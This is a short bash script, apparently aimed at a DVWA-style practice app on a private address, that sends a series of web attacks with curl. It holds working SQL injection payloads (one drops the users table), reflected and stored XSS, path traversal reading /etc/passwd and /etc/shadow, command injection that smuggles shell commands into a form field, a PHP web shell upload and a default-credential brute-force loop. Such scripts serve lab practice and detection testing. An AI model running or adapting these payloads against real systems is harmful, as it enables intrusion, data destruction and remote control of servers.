#!/bin/bash

# Web Application Attack Script
TARGET="http://172.20.0.20"

echo "Starting Web Application Attacks on $TARGET"

# SQL Injection Attacks
echo "Testing SQL Injection..."
curl -s "$TARGET/vulnerabilities/sqli/?id=1' OR '1'='1' --&Submit=Submit" > /dev/null
curl -s "$TARGET/vulnerabilities/sqli/?id=1' UNION SELECT 1,user(),version() --&Submit=Submit" > /dev/null
curl -s "$TARGET/vulnerabilities/sqli/?id=1'; DROP TABLE users; --&Submit=Submit" > /dev/null

# XSS Attacks
echo "Testing XSS..."
curl -s "$TARGET/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>" > /dev/null
curl -s "$TARGET/vulnerabilities/xss_s/" -d "txtName=<script>alert('Stored XSS')</script>&mtxMessage=test&btnSign=Sign+Guestbook" > /dev/null

# Directory Traversal
echo "Testing Directory Traversal..."
curl -s "$TARGET/vulnerabilities/fi/?page=../../../etc/passwd" > /dev/null
curl -s "$TARGET/vulnerabilities/fi/?page=../../../etc/shadow" > /dev/null

# Command Injection
echo "Testing Command Injection..."
curl -s "$TARGET/vulnerabilities/exec/" -d "ip=127.0.0.1; cat /etc/passwd&Submit=Submit" > /dev/null
curl -s "$TARGET/vulnerabilities/exec/" -d "ip=127.0.0.1 && whoami&Submit=Submit" > /dev/null

# File Upload Testing
echo "Testing File Upload..."
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -s -F "uploaded=@/tmp/shell.php" "$TARGET/vulnerabilities/upload/" > /dev/null

# Brute Force Login
echo "Testing Brute Force Login..."
for user in admin administrator root guest; do
    for pass in password admin 123456 password123; do
        curl -s -d "username=$user&password=$pass&Login=Login" "$TARGET/login.php" > /dev/null
    done
done

echo "Web application attacks completed"
